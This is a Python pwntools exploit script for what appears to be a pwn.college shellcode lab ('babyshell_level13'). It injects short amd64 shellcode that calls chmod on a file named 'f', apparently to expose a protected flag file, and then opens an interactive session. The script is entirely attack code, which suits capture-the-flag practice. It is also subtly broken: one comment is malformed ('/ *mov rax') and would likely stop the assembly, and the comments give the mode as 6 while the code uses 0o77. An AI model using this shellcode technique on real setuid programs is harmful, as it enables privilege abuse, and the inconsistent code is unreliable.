from pwn import *

DEBUG = len(sys.argv) > 1 and sys.argv[1] == 'debug'

bin_path = '/challenge/babyshell_level13'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path], cwd='/home/hacker')

print(p.recvuntil(b'[LEAK]').decode())

shellcode = f'''
push 0x{b'f'[::-1].hex()}  # 2 bytes

/* mov rdi, rsp 2 bytes */
push rsp
pop rdi

/* mov rsi, 0o006 3 bytes*/
mov sil, {hex(0o77)}

/ *mov rax, SYS_chmod 2 bytes */ 
mov al, SYS_chmod

syscall  # chmod("flag", 6)  2bytes
'''

shellcode = asm(shellcode)

print(disasm(shellcode))

p.send(shellcode)
print(p.interactive())
